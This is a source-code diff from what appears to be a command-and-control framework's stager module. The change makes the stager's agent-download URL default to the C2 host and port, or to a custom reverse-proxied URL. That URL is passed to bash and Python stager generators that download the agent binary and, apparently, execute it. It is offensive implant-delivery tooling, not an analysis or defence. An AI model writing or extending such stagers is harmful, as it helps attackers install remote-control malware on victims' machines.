@@ -37,7 +37,7 @@ func modStager() {
 
 	// stop stager HTTP server when needed
 	if tun.Stager_Ctx != nil {
-		CliPrintInfo("Looks like stager HTTP server is already running on port %s, we will shut it down", RuntimeConfig.HTTPListenerPort)
+		CliPrintInfo("Looks like stager HTTP server is already running on port %s, we will shut it down to serve the new file", RuntimeConfig.HTTPListenerPort)
 		tun.Stager_Cancel()
 		// shutdown server if needed
 		if err = tun.Stager_HTTP_Server.Shutdown(tun.Stager_Ctx); err != nil {
@@ -46,9 +46,16 @@ func modStager() {
 	}
 	tun.Stager_Ctx, tun.Stager_Cancel = context.WithCancel(context.Background())
 
+	url := fmt.Sprintf("http://%s:%s", RuntimeConfig.CCHost, RuntimeConfig.HTTPListenerPort)
+	if CliYesNo("Do you want to use the default URL (stager will download from it)") {
+		CliPrintInfo("Using default URL %s for agent binary download", url)
+	} else {
+		CliMsg("You will have to reverse proxy http://localhost:%s to your custom URL", RuntimeConfig.HTTPListenerPort)
+		url = CliAsk("Give me an HTTP download URL (stager will try downloading agent from this URL): ", false)
+	}
+
 	switch chosen_stager {
 	case "linux/bash":
-		url := CliAsk("Give me an HTTP download URL for agent binary (stager will try downloading from this URL): ", false)
 		stager_data := bash_http_downloader(url)
 		err = os.WriteFile(stager_filename, stager_data, 0600)
 		if err != nil {
@@ -76,7 +83,6 @@ func modStager() {
 
 		// serve agent binary
 	case "python":
-		url := CliAsk("Give me an HTTP download URL for agent binary (stager will try downloading from this URL): ", false)
 		stager_data := python_http_aes_download_exec(agent_bin_path, url)
 		err = os.WriteFile(stager_filename, stager_data, 0600)
 		if err != nil {
